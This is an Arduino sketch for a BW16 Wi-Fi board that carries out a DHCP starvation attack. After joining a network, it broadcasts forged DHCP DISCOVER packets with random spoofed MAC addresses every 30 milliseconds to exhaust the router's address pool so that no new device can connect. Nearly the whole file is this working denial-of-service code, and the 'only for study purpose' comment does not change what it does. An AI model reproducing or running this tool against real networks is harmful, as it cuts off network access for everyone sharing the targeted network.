//Strave DHTP attack on bw16, its blocks all IP addresses on the network and makes it impossible to connect to new one
//ONLY FOR STUDY PURPOSE
// WARNING: version of AmebaSDK must be 3.1.7 for normal compile
//made by SoDaVk, please give me a star on github: https://github.com/SODAVK
#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUdp.h>
WiFiUDP dhcpUdp;

void runDhcpStarvation() {
  Serial.println("\n[!] DHCP Starvation: STARTED");
  Serial.println("[!] Type 'stop' to pause the attack.");
  while (true) {
    if (Serial.available()) {
      String cmd = Serial.readStringUntil('\n');
      if (cmd.indexOf("stop") != -1) break;}
      
    uint32_t xid = random(0xFFFFFFFF);//transid
    uint8_t fakeMac[6];
    fakeMac[0] = 0x02;//adminaddr
    for (int i = 1; i < 6; i++) fakeMac[i] = random(256);
    ////
    uint8_t packet[300];
    memset(packet, 0, 300);
    packet[0] = 0x01;
    packet[1] = 0x01;
    packet[2] = 0x06;
    packet[3] = 0x00;
    memcpy(&packet[4], &xid, 4);//transid
    memcpy(&packet[28], fakeMac, 6);
    //cooke
    packet[236] = 0x63;
    packet[237] = 0x82;
    packet[238] = 0x53;
    packet[239] = 0x63;
    //
    packet[240] = 53;
    packet[241] = 1;
    packet[242] = 1; 
    //clientind
    packet[243] = 61;
    packet[244] = 7;
    packet[245] = 1;
    memcpy(&packet[246], fakeMac, 6);
    packet[252] = 255;//end

    dhcpUdp.beginPacket(IPAddress(255, 255, 255, 255), 67);
    dhcpUdp.write(packet, 300);
    dhcpUdp.endPacket();
    Serial.print("fludmac: ");
    for (int i = 0; i < 6; i++) {
      if (fakeMac[i] < 16) Serial.print("0");
      Serial.print(fakeMac[i], HEX);
      if (i < 5) Serial.print(":");}
    Serial.print(" | XID: ");
    Serial.println(xid, HEX);
    delay(30);}
  Serial.println("[!] DHCP Starvation: STOPPED");}

void setup() {
  Serial.begin(115200);
  Serial.print("\nConnecting to Wi-Fi...");

  WiFi.begin("u_ssid", "u_pass");//change

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");}
  Serial.println("type starve to start");}

void loop() {
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    if (input == "starve") {
      runDhcpStarvation();
}}}
